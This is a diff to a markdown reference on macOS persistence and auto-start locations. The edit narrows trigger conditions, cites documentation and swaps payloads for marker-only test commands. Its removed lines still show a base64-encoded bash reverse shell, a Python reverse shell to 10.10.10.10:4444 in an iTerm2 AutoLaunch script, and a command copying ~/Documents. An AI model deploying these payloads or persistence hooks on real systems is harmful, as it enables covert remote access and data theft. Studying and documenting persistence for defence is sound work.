@@ -201,6 +201,10 @@ Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://thee
   - **Trigger**: Start login Bash; the first readable file in that order runs. `~/.profile` is skipped when either earlier file exists.
 - **`/etc/profile`**
   - **Trigger**: Start login Bash; changing it requires root.
+- **`~/.tcshrc`** or, when absent, **`~/.cshrc`**
+  - **Trigger**: Start `tcsh`, including a noninteractive `tcsh -c` on this Mac. The user must actually invoke `tcsh`; it is not the default macOS shell.
+- **`~/.login`**
+  - **Trigger**: Start a login `tcsh` after its rc file.
 - `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
   - **Trigger**: Expected to trigger with xterm, but it **isn't installed** and even after installed this error is thrown: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>
 
@@ -226,6 +230,8 @@ rm -r "$lab"
 The observed order was `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` must already point to the alternate directory; merely writing files in an arbitrary directory is not enough.
 
 [Bash's startup reference](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) distinguishes login from interactive shells. On the macOS 26.5.2 test machine, an isolated `HOME` containing all four user startup files produced: `bash -c` → none, `bash -ic` → `.bashrc`, `bash -lc` and `bash -lic` → `.bash_profile` only. Removing `.bash_profile` made login Bash read `.bash_login`, then `.profile` when that was also removed. `BASH_ENV` can point noninteractive Bash at a file, but that environment variable must already be set in the invoking process. An explicit `exit` from a login Bash can also load `~/.bash_logout`.
+
+The local `tcsh(1)` manual documents its separate startup order. With a disposable `HOME`, `/bin/tcsh -c :` read `.tcshrc`, or `.cshrc` when `.tcshrc` was absent. A disposable login `tcsh` read `.tcshrc` and `.login`. These checks created and removed only temporary files.
 
 ### Re-opened Applications
 
@@ -281,7 +287,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.g
 #### Location
 
 - **`~/Library/Preferences/com.apple.Terminal.plist`**
-  - **Trigger**: Open Terminal
+  - **Trigger**: Open a new Terminal window or tab using the profile whose Shell settings contain the startup command
 
 #### Description & Exploitation
 
@@ -309,7 +315,7 @@ This config is reflected in the file **`~/Library/Preferences/com.apple.Terminal
 [...]
 ```
 
-So, if the plist of the preferences of the terminal in the system could be overwritten, the the **`open`** functionality can be used to **open the terminal and that command will be executed**.
+If the relevant profile contains a startup command and Terminal reads that preference, a new session using that profile can execute it. [Apple's current Terminal guide](https://support.apple.com/guide/terminal/trmlshll/mac) documents the per-profile **Shell → Startup** command. Merely opening Terminal without a new session using that profile is not enough. The preference edits below were **not** run on the research Mac.
 
 You can add this from the cli with:
 
@@ -331,11 +337,11 @@ You can add this from the cli with:
 #### Location
 
 - **Anywhere**
-  - **Trigger**: Open Terminal
+  - **Trigger**: Open the particular `.terminal`, `.command`, or `.tool` file
 
 #### Description & Exploitation
 
-If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.
+If a user opens a **`.terminal`** settings file, Terminal can create a session from its profile; executable **`.command`** and **`.tool`** files can also open in Terminal. This is an explicit file-open trigger, not execution from merely opening Terminal. Any inherited TCC access depends on Terminal's actual grants and the operation attempted. The historical example below was not run on the research Mac.
 
 Try it with:
 
@@ -347,7 +353,7 @@ cat > /tmp/test.terminal << EOF
 <plist version="1.0">
 <dict>
 	<key>CommandString</key>
-	<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
+	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
 	<key>ProfileCurrentVersion</key>
 	<real>2.0600000000000001</real>
 	<key>RunCommandAsShell</key>
@@ -363,8 +369,8 @@ EOF
 # Trigger it
 open /tmp/test.terminal
 
-# Use something like the following for a reverse shell:
-<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
+# After inspecting the marker, remove the disposable file and marker:
+rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
 ```
 
 You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.
@@ -385,19 +391,21 @@ Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 
 - **`/Library/Audio/Plug-Ins/HAL`**
   - Root required
-  - **Trigger**: Restart coreaudiod or the computer
+  - **Trigger**: The Core Audio server loads a compatible HAL device plug-in; a server restart may cause rediscovery
 - **`/Library/Audio/Plug-ins/Components`**
   - Root required
-  - **Trigger**: Restart coreaudiod or the computer
+  - **Trigger**: An audio host discovers and instantiates the installed Audio Unit
 - **`~/Library/Audio/Plug-ins/Components`**
-  - **Trigger**: Restart coreaudiod or the computer
+  - **Trigger**: An audio host discovers and instantiates the installed Audio Unit
 - **`/System/Library/Components`**
-  - Root required
-  - **Trigger**: Restart coreaudiod or the computer
+  - Apple-provided, system-protected location
+  - **Trigger**: An audio host instantiates a matching system component
 
 #### Description
 
 According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.<sup>[[6]](#references)[[7]](#references)</sup>
+
+HAL device plug-ins and Audio Units are distinct load paths. [Apple's Audio Unit hosting guide](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) says a host must find and instantiate a component; copying one into a scan directory or restarting `coreaudiod` does not by itself prove execution. AUv2 plug-ins run in the host process, while [Apple's current Audio Unit guidance](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) says AUv3 defaults to a separate process on macOS. Signature, sandbox, and library-validation gates depend on the host. No audio plug-in was installed or executed on the research Mac.
 
 ### CoreMIDI Drivers (MIDIServer)
 
@@ -458,6 +466,8 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.g
 QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.<sup>[[8]](#references)</sup>
 
 It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.
+
+These paths refer to legacy `.qlgenerator` bundles; [Apple's Quick Look architecture guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) documents the search order and matching file types. Current Quick Look **app extensions** are packaged with an app and have different registration and execution rules. A generator's presence does not establish that it wins type selection or that its code runs in Finder itself. The legacy generator path was reviewed from documentation and directory presence; no generator was installed or loaded on the research Mac.
 
 ### ~~Login/Logout Hooks~~
 
@@ -572,51 +582,35 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.g
 #### Locations
 
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
-  - **Trigger**: Open iTerm
+  - **Trigger**: Start iTerm2 with an eligible Python API script in that folder
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
-  - **Trigger**: Open iTerm
+  - **Trigger**: Start iTerm2; the AppleScript startup hook is documented separately
 - **`~/Library/Preferences/com.googlecode.iterm2.plist`**
-  - **Trigger**: Open iTerm
+  - **Trigger**: Create a session with the profile whose command or initial text invokes the payload
 
 #### Description & Exploitation
 
-Scripts stored in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** will be executed. For example:<sup>[[11]](#references)</sup>
+The [current iTerm2 Python API guide](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) documents auto-run **Python** scripts in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. It does not establish that an arbitrary executable `.sh` file in that folder runs. For a disposable account, save this as `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:
 
-```bash
-cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
-#!/bin/bash
-touch /tmp/iterm2-autolaunch
-EOF
-
-chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
-```
-
-or:
-
-```bash
-cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
-#!/usr/bin/env python3
-import iterm2,socket,subprocess,os
+```python
+import iterm2
+from pathlib import Path
 
 async def main(connection):
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
-    async with iterm2.CustomControlSequenceMonitor(
-            connection, "shared-secret", r'^create-window$') as mon:
-        while True:
-            match = await mon.async_get()
-            await iterm2.Window.async_create(connection)
+    Path('/tmp/ht-iterm-autolaunch-marker').touch()
 
-iterm2.run_forever(main)
-EOF
+iterm2.run_until_complete(main)
 ```
 
-The script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** will also be executed:
+The [current iTerm2 AppleScript guide](https://iterm2.com/documentation-scripting.html) separately documents `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, with a legacy `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` fallback when the modern folder does not exist. A marker-only AppleScript is:
 
-```bash
+```applescript
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
 
-The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2.plist`** can **indicate a command to execute** when the iTerm2 terminal is opened.
+These script examples were checked against iTerm2's documentation, not run in the active desktop session. After testing in a disposable account, remove the test script and `/tmp/ht-iterm-autolaunch-marker` or `/tmp/iterm2-autolaunchscpt`, respectively.
+
+The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2.plist`** can specify a profile command or initial text. The latter is typed into a session; execution depends on a shell interpreting it. [iTerm2's profile documentation](https://iterm2.com/documentation-preferences-profiles-general.html) describes the command run when a new session with that profile is created.
 
 This setting can be configured in the iTerm2 settings:
 
@@ -634,21 +628,7 @@ plutil -p com.googlecode.iterm2.plist
       "Initial Text" => "touch /tmp/iterm-start-command"
 ```
 
-You can set the command to execute with:
-
-```bash
-# Add
-/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist
-
-# Call iTerm
-open /Applications/iTerm.app/Contents/MacOS/iTerm2
-
-# Remove
-/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
-```
-
-> [!WARNING]
-> Highly probable there are **other ways to abuse the iTerm2 preferences** to execute arbitrary commands.
+For a safe assessment, inspect the chosen profile in iTerm2 settings or read a copy of its preference file. Changing `Initial Text` in a live profile would affect a user's sessions, so no preference was changed on the research Mac.
 
 ### xbar
 
@@ -712,9 +692,9 @@ EOF
 
 #### Location
 
-- `~/Library/Application Support/BetterTouchTool/*`
+- A script file **already referenced** by an enabled BetterTouchTool preset, or that preset's configuration under `~/Library/Application Support/BetterTouchTool/`. The precise script path depends on how the preset was configured.
 
-This tool allows to indicate applications or scripts to execute when some shortcuts are pressed . An attacker might be able configure his own **shortcut and action to execute in the database** to make it execute arbitrary code (a shortcut could be to just to press a key).
+[BetterTouchTool's action reference](https://docs.folivora.ai/docs/actions/action-definitions/) documents shell-script and background-command actions. The configured keyboard, mouse, touch, widget, or other event must occur while the relevant preset is active; [its trigger guide](https://docs.folivora.ai/docs/configuration/new-trigger/) shows this pairing. A random file in the application-support directory is not a trigger. An already configured action that loads an external writable script is a narrower write-to-execution target. Code runs as the BetterTouchTool user's account, subject to its actual macOS grants. BetterTouchTool was absent from `/Applications` on the research Mac, so no preset was changed or executed locally.
 
 ### Alfred
 
@@ -725,9 +705,28 @@ This tool allows to indicate applications or scripts to execute when some shortc
 
 #### Location
 
-- `???`
+- A script or file **already referenced** by an installed Alfred workflow, or that workflow inside the user's configured `Alfred.alfredpreferences` directory. The preferences directory may be synced and is not a fixed universal path.
 
-It allows to create workflows that can execute code when certain conditions are met. Potentially it's possible for an attacker to create a workflow file and make Alfred load it (it's needed to pay the premium version to use workflows).
+[Alfred's workflow guide](https://www.alfredapp.com/help/workflows/) describes the Powerpack prerequisite and installation through its UI. An installed workflow's hotkey, keyword, or other configured trigger must fire; [Alfred's hotkey example](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) demonstrates a script action. [Alfred's environment reference](https://www.alfredapp.com/help/workflows/script-environment-variables/) exposes the selected preferences path as `alfred_preferences`. Dropping an unregistered workflow file into an arbitrary directory does not prove it will be installed or run. Code runs as the signed-in Alfred user with its actual macOS grants. Alfred was absent from `/Applications` on the research Mac, so this path was assessed from documentation only.
+
+### Raycast Script Commands and extension refresh
+
+- **Write target:** An executable script in a directory **already added** under Raycast Settings → Script Commands. Raycast does not scan an arbitrary newly created directory. [Raycast's Script Commands guide](https://manual.raycast.com/script-commands) documents directory registration.
+- **Trigger and identity:** A user invokes the indexed command, a configured hotkey or fallback invokes it, or Raycast refreshes an `inline` script on its configured `@raycast.refreshTime`. The script runs as the signed-in Raycast user through its interpreter. The [upstream metadata reference](https://github.com/raycast/script-commands#metadata) limits automatic refresh to inline commands, and [Raycast's extension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) separately supports an `interval` for installed `no-view` or `menu-bar` extension commands. Merely adding a normal script command does not schedule it.
+
+For a disposable account with a registered script directory, a marker-only inline script is:
+
+```bash
+#!/bin/bash
+# @raycast.schemaVersion 1
+# @raycast.title Auto-start marker
+# @raycast.mode inline
+# @raycast.refreshTime 1m
+/usr/bin/touch /tmp/ht-raycast-refresh-marker
+echo ready
+```
+
+Save it in the registered directory, make it executable, and let Raycast refresh it. Then remove that file and `/tmp/ht-raycast-refresh-marker`. Raycast was not found under its usual `/Applications` name on the research Mac, so this is documentation-backed and was not run locally. Accessibility, Automation, and file grants remain subject to macOS permission prompts.
 
 ### Visual Studio Code automatic workspace tasks
 
@@ -830,6 +829,26 @@ git -C "$lab" checkout -qb probe
 test -e "$lab/ran" && echo 'post-checkout fired'
 rm -r "$lab"
 ```
+
+### npm lifecycle scripts in a project
+
+- **Write target:** The `scripts` map in a writable project's `package.json`, or an installed dependency package whose lifecycle script the user will run. This is a development workflow hook, not execution from opening a directory.
+- **Trigger and identity:** A later `npm install` or `npm ci` with lifecycle scripts allowed runs `preinstall`, `install`, and `postinstall` as the user invoking npm. An ordinary `npm run <name>` also runs matching `pre<name>` and `post<name>` scripts. [npm's lifecycle reference](https://docs.npmjs.com/cli/v11/using-npm/scripts) lists the events; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) can suppress install lifecycle scripts. Version and policy settings may change what is allowed, so check the target npm version.
+
+This marker-only PoC was run with local npm in a disposable, empty directory. It does not download dependencies or change a user's project:
+
+```bash
+lab=$(mktemp -d)
+cat > "$lab/package.json" <<'EOF'
+{"name":"ht-autostart-marker","version":"1.0.0","private":true,
+ "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
+EOF
+(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
+test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
+rm -r "$lab"
+```
+
+This is distinct from Python interpreter startup files: npm must perform the relevant install or run action, while Python `site` code can load on an ordinary interpreter invocation. Generic `Makefile` targets and build task definitions similarly require the user or an already configured tool to invoke that target; they are not separate OS auto-start paths.
 
 ### Vim startup configuration
 
@@ -939,6 +958,8 @@ find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
   -path '*/Contents/Library/LaunchAgents/*.plist' -o \
   -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
 ```
+
+For a bundled launch plist, resolve `BundleProgram` **relative to the app bundle root** (for example `Contents/MacOS/Helper`), as [Apple's Service Management migration guidance](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) specifies. A read-only `/Applications` inventory on the research Mac found 14 bundled helper entries and five `BundleProgram` declarations; all five targets resolved, and two passed a user-writability check. That check does **not** establish that either helper is registered, enabled, executable after signature validation, or reachable by a sandbox. `sfltool dumpbtm` listed 150 named records on this Mac; it is an inspection aid, not a test that every record is running.
 
 Older login items can also be managed through Apple events. It is possible to list, add, and remove them from the command line, although adding them changes the user's persistent login configuration and may require Automation approval:<sup>[[15]](#references)</sup>
 
@@ -1068,6 +1089,13 @@ If we print the job file, we find that it contains the same information we got u
 - **Execution identity and gates:** Calendar opens the chosen file for the signed-in user through its associated application. Launching an app bundle may execute its code as that user, subject to Gatekeeper, quarantine, and other macOS checks. A plain script file may merely open in an editor; its extension alone does not prove code execution.
 
 To assess a candidate safely, inspect the event's alert in Calendar and the selected file's permissions. This path was documented from Apple's guide and **not** run on the research Mac because testing it would modify a live calendar and wait for a desktop event. A test in a disposable account can select a marker-only app bundle, set a near-future Open file alert, confirm launch, and delete the event and app afterward.
+
+### Shortcuts automations on macOS
+
+- **Write target:** An executable file **already referenced** by a shortcut's action, or an existing shortcut that an authorized user can edit. A random `.shortcut` file or a write to an undocumented Shortcuts database is not a supported automation registration method.
+- **Trigger and identity:** A previously configured, enabled automation event, such as time of day or an app event, invokes the shortcut for the signed-in user. [Apple's current Mac automation guide](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) lists supported events, explains when an automation can run without asking, and describes removing a trigger. [Apple's Shortcuts privacy guide](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) requires **Allow Running Scripts** for script actions, and individual actions can still request permissions.
+
+This is a conditional write-to-execution path **only when the existing action loads a writable target**. Creating a new automation through the UI changes live settings and was not attempted on the research Mac. In a disposable account, an owner can configure a time-of-day shortcut whose script touches `/tmp/ht-shortcuts-marker`, enable the necessary permissions, confirm the marker after the event, then delete the automation, shortcut, and marker.
 
 ### Automator actions and Quick Actions
 
@@ -1301,6 +1329,8 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.gi
 
 Then, when the color picker is triggered, your bundle should execute as well.
 
+This is conditional on a compatible app opening the system color panel and selecting the installed picker. [Apple's color-panel guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) describes the legacy bundle locations. A local path check found the legacy color-picker XPC service, but no picker was installed or loaded on the research Mac; do not infer a TCC bypass from the path alone.
+
 Note that the binary loading your library has a **very restrictive sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
 ```bash
@@ -1318,7 +1348,7 @@ Note that the binary loading your library has a **very restrictive sandbox**: `/
 **Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>
 
 - Useful to bypass sandbox: **No, because you need to execute your own app**
-- TCC bypass: ???
+- TCC bypass: Depends on the enabled extension's sandbox and permissions; no general bypass established.
 
 #### Location
 
@@ -1329,6 +1359,8 @@ Note that the binary loading your library has a **very restrictive sandbox**: `/
 An application example with a Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).
 
 Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **must be signed** with some valid Apple developer certificate, it must be **sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:<sup>[[21]](#references)[[22]](#references)</sup>
+
+An installed extension also needs to be **enabled** and invoked for a relevant Finder location or item; writing an arbitrary `.appex` bundle is insufficient. [Apple's Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) exposes enabled state. The `pluginkit` commands below illustrate explicit registration and enabling, not a file-only auto-start. This route was documentation-reviewed, with no new extension installed or enabled on the research Mac.
 
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
@@ -1473,7 +1505,7 @@ To facilitate this rapid search capability, Spotlight maintains a **proprietary 
 
 The underlying mechanism of Spotlight involves a central process named 'mds', which stands for **'metadata server'.** This process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (`ps -ef | grep mdworker`). These tasks are made possible through Spotlight importer plugins, or **".mdimporter bundles**", which enable Spotlight to understand and index content across a diverse range of file formats.
 
-The plugins or **`.mdimporter`** bundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which **file type and extensions they can manage**, this way, Spotlight will use them when a new file with the indicated extension is created.
+The plugins or **`.mdimporter`** bundles are located in the places mentioned previously. A new bundle must be discovered and match a file type, and Spotlight must actually index a matching file; copying a bundle alone does not prove it has loaded. [Apple's MDImporter reference](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) ties loading to an eligible changed file. Spotlight importer execution on macOS 26 was not tested here.
 
 It's possible to **find all the `mdimporters`** loaded running:
 
